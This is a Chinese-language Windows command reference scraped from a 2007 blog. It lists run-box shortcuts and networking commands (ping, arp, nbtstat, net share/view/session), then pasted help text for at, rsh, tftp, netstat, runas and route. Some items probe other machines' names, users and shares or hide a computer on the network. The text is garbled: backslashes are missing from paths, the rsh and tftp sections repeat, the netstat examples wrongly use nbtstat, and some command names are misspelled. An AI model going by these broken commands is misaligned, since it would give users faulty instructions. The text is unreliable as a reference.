+control userpasswords2-----User Account 权限设置
+devmgmt.msc--- 设备管理器
+diskmgmt.msc---磁盘管理实用程序
+dfrg.msc-------磁盘碎片整理程序
+drwtsn32------ 系统医生
+dvdplay--------启动Media Player
+dxdiag-----------DirectX Diagnostic Tool
+gpedit.msc-------组策略编辑器
+gpupdate /target:computer /force 强制刷新组策略
+eventvwr.exe-----事件查看器
+explorer-------打开资源管理器
+logoff---------注销命令
+lusrmgr.msc----本机用户和组
+msinfo32---------系统信息
+msconfig---------系统配置实用程序
+net start (servicename)----启动该服务
+net stop (servicename)-----停止该服务
+notepad--------打开记事本
+nusrmgr.cpl-------同control userpasswords，打开用户帐户控制面板
+Nslookup-------IP地址侦测器
+oobe/msoobe /a----检查XP是否激活
+perfmon.msc----计算机性能监测程序
+progman--------程序管理器
+regedit----------注册表编辑器
+regedt32-------注册表编辑器
+regsvr32 /u *.dll----停止dll文件运行
+route print------查看路由表 
+rononce -p ----15秒关机
+rsop.msc-------组策略结果集
+rundll32.exe rundll32.exe %Systemroot%System32shimgvw.dll,ImageView_Fullscreen----启动一个空白的Windows 图片和传真查看器
+secpol.msc--------本地安全策略
+services.msc---本地服务设置
+sfc /scannow-----启动系统文件检查器
+sndrec32-------录音机
+taskmgr-----任务管理器（适用于2000／xp／2003）
+tsshutdn-------60秒倒计时关机命令
+winchat--------XP自带局域网聊天
+winmsd---------系统信息
+winver-----显示About Windows 窗口
+wupdmgr-----------Windows Update
+
+
+系统设置孤独※有情| 我的消息| 网易博客| 帮助| 退出  正在装扮我的博客，开始 [关闭]你已经拖动模块改变了首页的布局，点击“保存修改”后修改生效。    
+点击这里添加博客描述网易博客| 找朋友| 圈子| 拍拍| 搜索 孤独※有情 -  你有 10 条未读消息未读消息(10)- 换衣服| 设置| 退出  liruiqiu@126的博客 [编辑] 
+点击这里添加博客描述 [编辑]   首页 日志 相册 音乐  收藏 好友 关于我               日志
+  2007年9月10日
+2007年9月10日
+ 
+字号： 大大  中中  小小 2007年9月10日
+网络经典命令行
+
+         
+1.最基本，最常用的，测试物理网络的 
+ping 192.168.0.8 －t ，参数－t是等待用户去中断测试 
+
+2.查看DNS、IP、Mac等 
+A.Win98：winipcfg 
+B.Win2000以上：Ipconfig/all 
+
+C.NSLOOKUP：如查看河北的DNS 
+C:>nslookup 
+Default Server: ns.hesjptt.net.cn 
+Address: 202.99.160.68 
+>server 202.99.41.2 则将DNS改为了41.2 
+> pop.pcpop.com 
+Server: ns.hesjptt.net.cn 
+Address: 202.99.160.68 
+
+Non-authoritative answer: 
+Name: pop.pcpop.com 
+Address: 202.99.160.212 
+
+3.网络信使 （经常有人问的~） 
+Net send 计算机名/IP|* (广播) 传送内容，注意不能跨网段 
+net stop messenger 停止信使服务，也可以在面板－服务修改 
+net start messenger 开始信使服务 
+
+4.探测对方对方计算机名，所在的组、域及当前用户名 （追捕的工作原理） 
+ping －a IP －t ，只显示NetBios名 
+nbtstat -a 192.168.10.146 比较全的 
+
+5.netstat -a 显示出你的计算机当前所开放的所有端口 
+netstat -s -e 比较详细的显示你的网络资料，包括TCP、UDP、ICMP 和 IP的统计等 
+
+6.探测arp绑定（动态和静态）列表，显示所有连接了我的计算机，显示对方IP和MAC地址 
+arp -a 
+
+7.在代理服务器端 
+捆绑IP和MAC地址，解决局域网内盗用IP！： 
+ARP －s 192.168.10.59 00 －50－ff－6c－08－75 
+解除网卡的IP与MAC地址的绑定： 
+arp -d 网卡IP 
+
+8.在网络邻居上隐藏你的计算机 （让人家看不见你！） 
+net config server /hidden:yes 
+net config server /hidden:no 则为开启 
+
+9.几个net命令 
+A.显示当前工作组服务器列表 net view，当不带选项使用本命令时，它就会显示当前域或网络上的计算机上的列表。 
+比如：查看这个IP上的共享资源，就可以 
+C:>net view 192.168.10.8 
+在 192.168.10.8 的共享资源 
+资源共享名 类型 用途 注释 
+-------------------------------------- 
+网站服务 Disk 
+命令成功完成。 
+
+B.查看计算机上的用户帐号列表 net user 
+C.查看网络链接 net use 
+例如：net use z: 192.168.10.8movie 将这个IP的movie共享目录映射为本地的Z盘 
+
+D.记录链接 net session 
+例如： 
+C:>net session 
+计算机 用户名 客户类型 打开空闲时间 
+------------------------------------------------------------------------------- 
+192.168.10.110 ROME Windows 2000 2195 0 00:03:12 
+
+192.168.10.51 ROME Windows 2000 2195 0 00:00:39 
+命令成功完成。 
+
+10.路由跟踪命令 
+A.tracert pop.pcpop.com 
+B.pathping pop.pcpop.com 除了显示路由外，还提供325S的分析，计算丢失包的％
+
+11.关于共享安全的几个命令 
+A.查看你机器的共享资源 net share 
+B.手工删除共享（可以编个bat文件，开机自运行，把共享都删了！） 
+net share c$ /d 
+net share d$ /d 
+net share ipc$ /d 
+net share admin$ /d 
+注意$后有空格。 
+C.增加一个共享： 
+c:
+et share mymovie=e:downloadsmovie /users:1 
+mymovie 共享成功。 
+同时限制链接用户数为1人。 
+
+12.在DOS行下设置静态IP 
+A.设置静态IP 
+CMD 
+netsh 
+netsh>int 
+interface>ip 
+interface ip>set add "本地链接" static IP地址 mask gateway 
+B.查看IP设置 
+interface ip>show address 
+
+Arp 
+显示和修改“地址解析协议 (ARP)”缓存中的项目。ARP 缓存中包含一个或多个表，它们用于存储 IP 地址及其经过解析的以太网或令牌环物理地址。计算机上安装的每一个以太网或令牌环网络适配器都有自己单独的表。如果在没有参数的情况下使用，则 arp 命令将显示帮助信息。 
+
+语法 
+arp [-a [InetAddr] [-N IfaceAddr]] [-g [InetAddr] [-N IfaceAddr]] [-d InetAddr [IfaceAddr]] [-s InetAddr EtherAddr [IfaceAddr]] 
+
+参数 
+-a [InetAddr] [-N IfaceAddr] 
+显示所有接口的当前 ARP 缓存表。要显示指定 IP 地址的 ARP 缓存项，请使用带有 InetAddr 参数的 arp -a，此处的 InetAddr 代表指定的 IP 地址。要显示指定接口的 ARP 缓存表，请使用 -N IfaceAddr 参数，此处的 IfaceAddr 代表分配给指定接口的 IP 地址。-N 参数区分大小写。 
+-g [InetAddr] [-N IfaceAddr] 
+与 -a 相同。 
+-d InetAddr [IfaceAddr] 
+删除指定的 IP 地址项，此处的 InetAddr 代表 IP 地址。对于指定的接口，要删除表中的某项，请使用 IfaceAddr 参数，此处的 IfaceAddr 代表分配给该接口的 IP 地址。要删除所有项，请使用星号 (*) 通配符代替 InetAddr。 
+-s InetAddr EtherAddr [IfaceAddr] 
+向 ARP 缓存添加可将 IP 地址 InetAddr 解析成物理地址 EtherAddr 的静态项。要向指定接口的表添加静态 ARP 缓存项，请使用 IfaceAddr 参数，此处的 IfaceAddr 代表分配给该接口的 IP 地址。 
+/? 
+在命令提示符显示帮助。 
+注释 
+InetAddr 和 IfaceAddr 的 IP 地址用带圆点的十进制记数法表示。 
+物理地址 EtherAddr 由六个字节组成，这些字节用十六进制记数法表示并且用连字符隔开（比如，00-AA-00-4F-2A-9C）。 
+通过 -s 参数添加的项属于静态项，它们不会 ARP 缓存中超时。如果终止 TCP/IP 协议后再启动，这些项会被删除。要创建永久的静态 ARP 缓存项，请在批处理文件中使用适当的 arp 命令并通过“计划任务程序”在启动时运行该批处理文件。 
+只有当网际协议 (TCP/IP) 协议在 网络连接中安装为网络适配器属性的组件时，该命令才可用。 
+范例 
+要显示所有接口的 ARP 缓存表，可键入： 
+
+arp -a 
+
+对于指派的 IP 地址为 10.0.0.99 的接口，要显示其 ARP 缓存表，可键入： 
+
+arp -a -N 10.0.0.99 
+
+要添加将 IP 地址 10.0.0.80 解析成物理地址 00-AA-00-4F-2A-9C 的静态 ARP 缓存项，可键入： 
+
+arp -s 10.0.0.80 00-AA-00-4F-2A-9C 
+
+At 
+计划在指定时间和日期在计算机上运行命令和程序。at 命令只能在“计划”服务运行时使用。如果在没有参数的情况下使用，则 at 列出已计划的命令。 
+
+语法 
+at [ComputerName] [{[ID] [/delete]|/delete [/yes]}] 
+
+at [[ComputerName] hours:minutes [/interactive] [{/every:date[,...]|/next:date[,...]}] command] 
+
+参数 
+computername 
+指定远程计算机。如果省略该参数，则 at 计划本地计算机上的命令和程序。 
+ID 
+指定指派给已计划命令的识别码。 
+/delete 
+取消已计划的命令。如果省略了 ID，则计算机中所有已计划的命令将被取消。 
+/yes 
+删除已计划的事件时，对来自系统的所有询问都回答“是”。 
+hours:minutes 
+指定命令运行的时间。该时间用 24 小时制（即从 00:00 [午夜] 到 23:59）的 小时: 分钟格式表示。 
+/interactive 
+对于在运行 command 时登录的用户,允许 command 与该用户的桌面进行交互。 
+/every: 
+在每个星期或月的指定日期（例如，每个星期四，或每月的第三天）运行 command 命令。 
+date 
+指定运行命令的日期。可以指定一周的某日或多日（即，键入 M、T、W、Th、F、S、Su）或一个月中的某日或多日（即，键入从 1 到31 之间的数字）。用逗号分隔多个日期项。如果省略了 date，则 at 使用该月的当前日。 
+/next: 
+在下一个指定日期（比如，下一个星期四）到来时运行 command。 
+command 
+指定要运行的 Windows 命令、程序（.exe 或 .com 文件）或批处理程序（.bat 或 .cmd 文件）。当命令需要路径作为参数时，请使用绝对路径，也就是从驱动器号开始的整个路径。如果命令在远程计算机上，请指定服务器和共享名的通用命名协定 (UNC) 符号，而不是远程驱动器号。 
+/? 
+在命令提示符显示帮助。 
+注释 
+Schtasks 是功能更为强大的超集命令行计划工具，它含有 at 命令行工具中的所有功能。对于所有的命令行计划任务，都可以使用 schtasks 来替代 at。有关 schtasks 的详细信息，请参阅“相关主题”。
+
+使用 at 
+使用 at 命令时，要求您必须是本地 Administrators 组的成员。 
+
+加载 Cmd.exe 
+在运行命令之前，At 不会自动加载 Cmd.exe （命令解释器）。如果没有运行可执行文件 (.exe)，则在命令开头必须使用如下所示的方法专门加载 Cmd.exe： 
+
+cmd /c dir > c:        est.out。 
+
+查看已计划的命令 
+当不带命令行选项使用 at 时，计划任务会出现在类似于以下格式的表中： 
+
+Status ID Day Time Command Line 
+OK 1 Each F 4:30 PM net send group leads status due 
+OK 2 Each M 12:00 AM chkstor > check.file 
+OK 3 Each F 11:59 PM backup2.bat 
+包含标识号 (ID) 
+当在命令提示下使用带有标识号 (ID) 的 at 命令时，单个任务项的信息会显示在类似于下面的格式中： 
+
+Task ID： 1 
+
+Status:OK 
+
+Schedule:Each F 
+
+Time of Day:4:30 PM 
+
+Command:net send group leads status due当计划带有 at 的命令（尤其是带有命令行选项的命令）后，要通过键入不带命令行选项的 at 来检查该命令语法是否输入正确。如果显示在“命令行”列中的信息不正确，请删除该命令，然后重新键入它。如果还不正确，则可以在重新键入该命令时让它少带些命令行选项。 
+
+查看结果 
+使用 at 的已经计划的命令作为后台程序运行。运行结果不会显示在计算机上。要将输出重定向到文件，请使用重定向符号 (> )。如果将输出重定向到文件，则不论是在命令行还是在批处理文件中使用 at，都需要在重定向符号之前使用转义符 (^)。例如，要重定向输出到 Output.text 文件，则要键入： 
+
+at 14:45 c:        est.bat ^>cutput.txt 
+
+执行命令的当前目录为 systemroot 文件夹。 
+
+更改系统时间 
+在使用 at 命令计划了要运行的命令之后，如果更改了计算机的系统时间，则通过键入不带命令行选项的 at 可使 at 计划程序与修改后的系统时间同步。 
+
+存储命令 
+已计划的命令存储在注册表中。这样，如果重新启动“计划”服务，则不会丢失计划任务。 
+
+连接到网络驱动器 
+对于需要访问网络的计划作业，请不要使用已重新定向的驱动器。“计划”服务可能无法访问这些重定向的驱动器，或者，在该计划任务运行时如果有其他用户登录，则这些重定向的驱动器可能不会出现。因此，对于计划作业，请使用 UNC 路径。例如： 
+
+at 1:00pm my_backup servershare 
+
+请不要使用下述语法（其中 x: ?表示由用户建立的连接）： 
+
+at 1:00pm my_backup x: 
+
+如果计划了一个使用驱动器号的 at 命令来连接共享目录，则应包含一个 at 命令以使在完成该驱动器的使用时断开与驱动器的连接。如果不能断开与驱动器的连接，则在命令提示下，所指派的驱动器号将不可用。 
+
+范例 
+要显示 Marketing 服务器上已计划的命令列表，请键入： 
+
+at marketing 
+要了解服务器 Corp 上标识号为 3 的命令的详细信息，请键入： 
+
+at corp 3 
+要计划在上午 8:00 于 Corp 服务器上运行网络共享命令，并将该列表重定向到 Maintenance 服务器的 Corp.txt 文件（位于 Reports 共享目录下）中，请键入： 
+
+at corp 08:00 cmd /c "net share reports=d:marketing
+eports >> maintenance
+eportscorp.txt" 
+为了在每五天后的午夜将 Marketing 服务器的硬盘驱动器备份到磁带驱动器，首先创建名为 Archive.cmd 的批处理程序（它含有备份命令），然后计划该批处理程序的运行，为此请键入： 
+
+at marketing 00:00 /every:5,10,15,20,25,30 archive 
+要取消当前服务器上已计划的所有命令，请按下述方法清除 at 计划信息： 
+
+at /delete 
+如果要运行的命令不是可执行 (.exe) 文件，请按如下所示的方法在该命令之前使用 cmd /c 来加载 Cmd.exe： 
+
+cmd /c dir > c:        est.out。 
+Rsh 
+在运行 RSH 服务的远程计算机上运行命令。Windows XP 和 Windows 2000 不提供 RSH 服务。Windows 2000 Server Resource Kit 提供名为 Rshsvc.exe 的 RSH 服务。使用不带参数的 rsh 显示帮助。 
+
+语法 
+rsh [Host] [-l UserName] [-n] [Command] 
+
+参数 
+Host 
+指定运行 command 的远程计算机。 
+-l UserName 
+指定远程计算机上使用的用户名。在省略情况下，使用当前登录用户的名称。 
+-n 
+将 rsh 的输入重定向到 NULL 设备。这防止本地计算机命令结果的显示。 
+Command 
+指定要运行的命令。 
+/? 
+在命令提示符显示帮助。 
+注释 
+标准操作 
+rsh 命令将标准输入复制到远程 command，将远程 command 的标准输出复制到其标准输出，将远程 command 的标准错误复制到其标准错误。Rsh 通常在远程命令终止时终止。
+
+使用重定向符号 
+为了使重定向在远程计算机上发生，要以引号引住重定向符号（例如 ">>"）。如果不使用引号，重定向会在本地计算机发生。例如，以下命令将远程文件“RemoteFile”附加到本地文件“LocalFile”中： 
+
+rsh othercomputer cat remotefile >> localfile 
+
+以下命令将远程文件 Remotefile 附加到远程文件 otherremotefile 中： 
+
+rsh othercomputer cat remotefile ">>" otherremotefile 
+
+使用 rsh 
+在使用已登录到某个域并且运行 Windows XP Professional 的计算机时，该域的主域控制器必须可用于确认用户名或 rsh 命令失败。 
+
+.rhosts 文件 
+.rhosts 文件通常许可 UNIX 系统的网络访问权限。.rhosts 文件列出可以访问远程计算机的计算机名及关联的登录名。在正确配置了 .rhosts 文件的远程计算机上运行 rcp、rexec 或 rsh 命令时，您不必提供远程计算机的登录和密码信息。 
+
+.rhosts 文件是一个文本文件，该文件中每一行为一个条目。条目由本地计算机名、本地用户名和有关该条目的所有注释组成。每个条目均由制表符或空格分开，注释用符号 (#) 打头。例如： 
+
+host7 #This computer is in room 31A 
+
+.rhosts 文件必须在远程计算机的用户主目录中。有关远程计算机 .rhosts 文件特定执行的详细信息，请参阅远程系统的文档。 
+
+只有当网际协议 (TCP/IP) 协议在 网络连接中安装为网络适配器属性的组件时，该命令才可用。 
+范例 
+要以名称 admin1 在远程计算机 vax1 上执行 telcon 命令，请键入： 
+
+rsh vax1 -l admin1 telcon 
+
+Tftp 
+向运行平凡文件传输协议 (TFTP) 服务或 daemon 的远程计算机（尤其是运行 UNIX 的计算机）传输文件或从运行平凡文件传输协议 (TFTP) 服务或 daemon 的远程计算机（尤其是运行 UNIX 的计算机）传输文件。 
+
+语法 
+tftp [-i] [Host] [{get | put}] [Source] [Destination] 
+
+参数 
+-i 
+指定二进制图像传送模式（也称为八进制模式）。在二进制图像模式下，文件以一个字节为单位进行传输。在传送二进制文件时使用该模式。如果省略了 -i，文件将以 ASCII 模式传送。这是默认的传送模式。该模式将行尾 (EOL) 字符转换为指定计算机的适当格式。传送文本文件时使用该模式。如果文件传送成功，将显示数据传输率。 
+Host 
+指定本地或远程计算机。 
+put 
+将本地计算机上的 Destination 文件传送到远程计算机上的 Source 文件。因为 TFTP 协议不支持用户身份验证，所以用户必须登录到远程计算机，同时文件在远程计算机上必须可写。 
+get 
+将远程计算机上的 Destination 文件传送到本地计算机上的 Source 文件。 
+Source 
+指定要传送的文件。 
+Destination 
+指定将文件传送到的位置。如果省略了 Destination，将假定它与 Source 同名。 
+/? 
+在命令提示符显示帮助。 
+注释 
+使用 get 参数 
+如果将本地计算机上的文件 FileTwo 传送到远程计算机上的文件 FileOne，则指定 put。如果将远程计算机上的文件 FileTwo 传送到远程计算机上的文件 FileOne，则指定 get。 
+
+Windows XP 或 Windows 2000 不提供一般用途的 TFTP 服务器。Windows 2000 提供的 TFTP 服务器服务只为 Windows XP 和 Windows 2000 客户端计算机提供远程引导功能。 
+只有当网际协议 (TCP/IP) 协议在 网络连接中安装为网络适配器属性的组件时，该命令才可用。 
+范例 
+要从本地计算机将文件 Users.txt 传送到远程计算机 vax1 上的 Users19.txt，请键入： 
+
+tftp vax1 put users.txt users19.txt 
+Nbtstat 
+显示本地计算机和远程计算机的基于 TCP/IP (NetBT) 协议的 NetBIOS 统计资料、NetBIOS 名称表和 NetBIOS 名称缓存。Nbtstat 可以刷新 NetBIOS 名称缓存和注册的 Windows Internet 名称服务 (WINS) 名称。使用不带参数的 nbtstat 显示帮助。
+
+使用重定向符号 
+为了使重定向在远程计算机上发生，要以引号引住重定向符号（例如 ">>"）。如果不使用引号，重定向会在本地计算机发生。例如，以下命令将远程文件“RemoteFile”附加到本地文件“LocalFile”中： 
+
+rsh othercomputer cat remotefile >> localfile 
+
+以下命令将远程文件 Remotefile 附加到远程文件 otherremotefile 中： 
+
+rsh othercomputer cat remotefile ">>" otherremotefile 
+
+使用 rsh 
+在使用已登录到某个域并且运行 Windows XP Professional 的计算机时，该域的主域控制器必须可用于确认用户名或 rsh 命令失败。 
+
+.rhosts 文件 
+.rhosts 文件通常许可 UNIX 系统的网络访问权限。.rhosts 文件列出可以访问远程计算机的计算机名及关联的登录名。在正确配置了 .rhosts 文件的远程计算机上运行 rcp、rexec 或 rsh 命令时，您不必提供远程计算机的登录和密码信息。 
+
+.rhosts 文件是一个文本文件，该文件中每一行为一个条目。条目由本地计算机名、本地用户名和有关该条目的所有注释组成。每个条目均由制表符或空格分开，注释用符号 (#) 打头。例如： 
+
+host7 #This computer is in room 31A 
+
+.rhosts 文件必须在远程计算机的用户主目录中。有关远程计算机 .rhosts 文件特定执行的详细信息，请参阅远程系统的文档。 
+
+只有当网际协议 (TCP/IP) 协议在 网络连接中安装为网络适配器属性的组件时，该命令才可用。 
+范例 
+要以名称 admin1 在远程计算机 vax1 上执行 telcon 命令，请键入： 
+
+rsh vax1 -l admin1 telcon 
+
+Tftp 
+向运行平凡文件传输协议 (TFTP) 服务或 daemon 的远程计算机（尤其是运行 UNIX 的计算机）传输文件或从运行平凡文件传输协议 (TFTP) 服务或 daemon 的远程计算机（尤其是运行 UNIX 的计算机）传输文件。 
+
+语法 
+tftp [-i] [Host] [{get | put}] [Source] [Destination] 
+
+参数 
+-i 
+指定二进制图像传送模式（也称为八进制模式）。在二进制图像模式下，文件以一个字节为单位进行传输。在传送二进制文件时使用该模式。如果省略了 -i，文件将以 ASCII 模式传送。这是默认的传送模式。该模式将行尾 (EOL) 字符转换为指定计算机的适当格式。传送文本文件时使用该模式。如果文件传送成功，将显示数据传输率。 
+Host 
+指定本地或远程计算机。 
+put 
+将本地计算机上的 Destination 文件传送到远程计算机上的 Source 文件。因为 TFTP 协议不支持用户身份验证，所以用户必须登录到远程计算机，同时文件在远程计算机上必须可写。 
+get 
+将远程计算机上的 Destination 文件传送到本地计算机上的 Source 文件。 
+Source 
+指定要传送的文件。 
+Destination 
+指定将文件传送到的位置。如果省略了 Destination，将假定它与 Source 同名。 
+/? 
+在命令提示符显示帮助。 
+注释 
+使用 get 参数 
+如果将本地计算机上的文件 FileTwo 传送到远程计算机上的文件 FileOne，则指定 put。如果将远程计算机上的文件 FileTwo 传送到远程计算机上的文件 FileOne，则指定 get。 
+
+Windows XP 或 Windows 2000 不提供一般用途的 TFTP 服务器。Windows 2000 提供的 TFTP 服务器服务只为 Windows XP 和 Windows 2000 客户端计算机提供远程引导功能。 
+只有当网际协议 (TCP/IP) 协议在 网络连接中安装为网络适配器属性的组件时，该命令才可用。 
+范例 
+要从本地计算机将文件 Users.txt 传送到远程计算机 vax1 上的 Users19.txt，请键入： 
+
+tftp vax1 put users.txt users19.txt 
+Nbtstat 
+显示本地计算机和远程计算机的基于 TCP/IP (NetBT) 协议的 NetBIOS 统计资料、NetBIOS 名称表和 NetBIOS 名称缓存。Nbtstat 可以刷新 NetBIOS 名称缓存和注册的 Windows Internet 名称服务 (WINS) 名称。使用不带参数的 nbtstat 显示帮助。
+
+只有当网际协议 (TCP/IP) 协议在 网络连接中安装为网络适配器属性的组件时，该命令才可用。 
+范例 
+要显示 NetBIOS 计算机名为 CORP07 的远程计算机的 NetBIOS 名称表，请键入： 
+
+nbtstat -a CORP07 
+
+要显示所分配 IP 地址为 10.0.0.99 的远程计算机的 NetBIOS 名称表，请键入： 
+
+nbtstat -A 10.0.0.99 
+
+要显示本地计算机的 NetBIOS 名称表，请键入： 
+
+nbtstat -n 
+
+要显示本地计算机 NetBIOS 名称缓存的内容，请键入： 
+
+nbtstat -c 
+
+要清除 NetBIOS 名称缓存并重新装载本地 Lmhosts 文件中带标记 #PRE 的项目，请键入： 
+
+nbtstat -R 
+
+要释放通过 WINS 服务器注册的 NetBIOS 名称并对其重新注册，请键入： 
+
+nbtstat -RR 
+
+要每隔 5 秒以 IP 地址显示 NetBIOS 会话统计资料，请键入： 
+
+nbtstat -S 5 
+
+Netstat 
+显示活动的 TCP 连接、计算机侦听的端口、以太网统计信息、IP 路由表、IPv4 统计信息（对于 IP、ICMP、TCP 和 UDP 协议）以及 IPv6 统计信息（对于 IPv6、ICMPv6、通过 IPv6 的 TCP 以及通过 IPv6 的 UDP 协议）。使用时如果不带参数，netstat 显示活动的 TCP 连接。 
+
+语法 
+netstat [-a] [-e] [-n] [-o] [-p Protocol] [-r] [-s] [Interval] 
+
+参数 
+-a 
+显示所有活动的 TCP 连接以及计算机侦听的 TCP 和 UDP 端口。 
+-e 
+显示以太网统计信息，如发送和接收的字节数、数据包数。该参数可以与 -s 结合使用。 
+-n 
+显示活动的 TCP 连接，不过，只以数字形式表现地址和端口号，却不尝试确定名称。 
+-o 
+显示活动的 TCP 连接并包括每个连接的进程 ID (PID)。可以在 Windows 任务管理器中的“进程”选项卡上找到基于 PID 的应用程序。该参数可以与 -a、-n 和 -p 结合使用。 
+-p Protocol 
+显示 Protocol 所指定的协议的连接。在这种情况下，Protocol 可以是 tcp、udp、tcpv6 或 udpv6。如果该参数与 -s 一起使用按协议显示统计信息，则 Protocol 可以是 tcp、udp、icmp、ip、tcpv6、udpv6、icmpv6 或 ipv6。 
+-s 
+按协议显示统计信息。默认情况下，显示 TCP、UDP、ICMP 和 IP 协议的统计信息。如果安装了 Windows XP 的 IPv6 协议，就会显示有关 IPv6 上的 TCP、IPv6 上的 UDP、ICMPv6 和 IPv6 协议的统计信息。可以使用 -p 参数指定协议集。 
+-r 
+显示 IP 路由表的内容。该参数与 route print 命令等价。 
+Interval 
+每隔 Interval 秒重新显示一次选定的信息。按 CTRL+C 停止重新显示统计信息。如果省略该参数，netstat 将只打印一次选定的信息。 
+/? 
+在命令提示符显示帮助。 
+注释 
+与该命令一起使用的参数必须以连字符 (-) 而不是以短斜线 (/) 作为前缀。 
+Netstat 提供下列统计信息： 
+Proto 
+协议的名称（TCP 或 UDP）。 
+
+Local Address 
+本地计算机的 IP 地址和正在使用的端口号。如果不指定 -n 参数，就显示与 IP 地址和端口的名称对应的本地计算机名称。如果端口尚未建立，端口以星号（*）显示。 
+
+Foreign Address 
+连接该插槽的远程计算机的 IP 地址和端口号码。如果不指定 -n 参数，就显示与 IP 地址和端口对应的名称。如果端口尚未建立，端口以星号（*）显示。 
+
+(state) 
+表明 TCP 连接的状态。可能的状态如下： 
+
+CLOSE_WAIT 
+
+CLOSED 
+
+ESTABLISHED 
+
+FIN_WAIT_1 
+
+FIN_WAIT_2 
+
+LAST_ACK 
+
+LISTEN 
+
+SYN_RECEIVED 
+
+SYN_SEND 
+
+TIMED_WAIT
+
+有关 TCP 连接状态的信息，请参阅 RFC 793。 
+
+只有当网际协议 (TCP/IP) 协议在 网络连接中安装为网络适配器属性的组件时，该命令才可用。 
+范例 
+要想显示以太网统计信息和所有协议的统计信息，请键入下列命令： 
+
+netstat -e -s 
+
+要想仅显示 TCP 和 UDP 协议的统计信息，请键入下列命令： 
+
+netstat -s -p tcp udp 
+
+要想每 5 秒钟显示一次活动的 TCP 连接和进程 ID，请键入下列命令： 
+
+nbtstat -o 5 
+
+要想以数字形式显示活动的 TCP 连接和进程 ID，请键入下列命令： 
+
+nbtstat -n –o 
+
+Runas 
+允许用户用其他权限运行指定的工具和程序，而不是用户当前登录提供的权限。 
+
+语法 
+runas [{/profile|/noprofile}] [/env] [/netonly] [/smartcard] [/showtrustlevels] [/trustlevel] /user:UserAccountName program 
+
+参数 
+/profile 
+加载用户的配置文件。/profile 是默认值。 
+/no profile 
+/noprofile 指定不加载用户的配置文件。这使应用程序载入的更加快速，但是在一些应用程序中也会引起错误。 
+/env 
+指定当前使用的网络环境，而不是用户的本地环境。 
+/netonly 
+指明指定的用户信息只用于远程访问。 
+/smartcard 
+/smartcard 表示凭据是否是由智能卡提供的。 
+/showtrustlevels 
+列出 /trustlevel 开关项。 
+/trustlevel 
+指定应用程序运行所在的授权级别。使用 /showtrustlevels 查看可用的信任级别。 
+/user:UserAccountName 
+指定在其下运行程序的用户帐户的名称。用户帐户的格式应是 user@domain 或 domainuser。 
+程序 
+指定要用在 /user 中指定的帐户运行的程序或命令。 
+/? 
+在命令提示符显示帮助。 
+注释 
+管理员可以使用一个权限受限制的帐户执行日常、非管理性的任务，只有在执行特定管理任务时，才使用一个权限更大的帐户。要不经过注销再重新登录就完成这样的任务，可以用一般帐户登录，然后使用 runas 命令来运行需要更大权限的工具。 
+有关 runas 命令的使用范例，请参阅“相关主题”。 
+尽管 runas 通常由 Administrator 帐户使用，但并非仅限于 Administrator 帐户。任何拥有多个帐户的用户均可以利用备用凭据，使用 runas 运行程序、MMC 控制台或“控制面板”项。 
+如果要在计算机上使用 Administrator 帐户，对于 /user:，键入下列参数之一： 
+/user:AdministratorAccountName@ComputerName 
+
+/user:ComputerNameAdministratorAccountName 
+
+如果想以域管理员身份使用这个命令，键入下列参数之一： 
+/user:AdministratorAccountName@DomainName 
+
+/useromainNameAdministratorAccountName 
+
+runas 命令允许您运行程序 (*.exe)、保存的 MMC 控制台 (*.msc)、程序和保存的 MMC 控制台的快捷方式及“控制面板”项。作为另一组（例如“Users”或“Power Users”组）的成员登录到计算机时，可以以管理员的身份运行。 
+可以使用 runas 命令来启动任何程序、MMC 控制器或“控制面板”项。只要提供适当的用户帐户和密码信息，用户帐户就具有登录到计算机的能力，并且程序、MMC 控制台、“控制面板”项在系统中及对该用户帐户均可用. 
+runas 命令允许您管理其他域的服务器（运行工具的计算机和要管理的服务器在不同的域中）。 
+如果尝试使用 runas 从网络位置启动程序、MMC 控制台或“控制面板”项，可能会因为用来连接网络共享的凭据与用来启动程序的凭据不同而失败。后者的凭据可能无法访问同一网络共享。 
+有些项，例如“打印机”文件夹和桌面项，间接由 Windows 2000 打开，而不能使用 runas 命令启动。 
+如果 runas 命令失败，则可能是没有运行 RunAs 服务或使用的用户帐户无效。要检查 RunAs 服务的状态，请在“计算机管理”中单击“服务和应用程序”，然后单击“服务”。要测试用户帐户，请尝试使用该帐户登录合适的域。 
+范例 
+要在本地计算机上以管理员身份启动 Windows 2000 命令提示行实例，请键入： 
+
+runas /user:localmachinenameadministrator cmd 
+系统提示时，键入管理员密码。 
+
+要使用名为 companydomaindomainadmin 的域管理员帐户启动“计算机管理”管理单元实例，请键入： 
+
+runas /user:companydomaindomainadmin "mmc %windir%system32compmgmt.msc" 
+当提示时，键入帐户密码。 
+
+要使用名为 domain.microsoft.com 的域中的域管理员帐户 user 启动“记事本”实例，请键入： 
+
+runas /user:user@domain.microsoft.com "notepad my_file.txt" 
+当提示时，键入帐户密码。
+
+要启动命令提示符行窗口、保存的 MMC 控制台、控制面板项或管理其他地点服务器的程序的一个实例，请键入： 
+
+runas /netonly /user:domainusername "command" 
+domainusername 必须是有足够权限管理服务器的用户。当提示时，键入帐户密码。 
+Route 
+在本地 IP 路由表中显示和修改条目。使用不带参数的 route 可以显示帮助。 
+
+语法 
+route [-f] [-p] [Command [Destination] [mask Netmask] [Gateway] [metric Metric]] [if Interface]] 
+
+参数 
+-f 
+清除所有不是主路由（网掩码为 255.255.255.255 的路由）、环回网络路由（目标为 127.0.0.0，网掩码为 255.255.255.0 的路由）或多播路由（目标为 224.0.0.0，网掩码为 240.0.0.0 的路由）的条目的路由表。如果它与命令之一（例如 add、change 或 delete）结合使用，表会在运行命令之前清除。 
+-p 
+与 add 命令共同使用时，指定路由被添加到注册表并在启动 TCP/IP 协议的时候初始化 IP 路由表。默认情况下，启动 TCP/IP 协议时不会保存添加的路由。与 print 命令一起使用时，则显示永久路由列表。所有其它的命令都忽略此参数。永久路由存储在注册表中的位置是 HKEY_LOCAL_MACHINESYSTEMCurrentControlSetServicesTcpipParametersPersistentRoutes。 
+Command 
+指定要运行的命令。下表列出了有效的命令。 命令 目的 
+add 添加路由 
+change 更改现存路由 
+delete 删除路由 
+print 打印路由 
+
+Destination 
+指定路由的网络目标地址。目标地址可以是一个 IP 网络地址（其中网络地址的主机地址位设置为 0），对于主机路由是 IP 地址，对于默认路由是 0.0.0.0。 
+mask subnetmask 
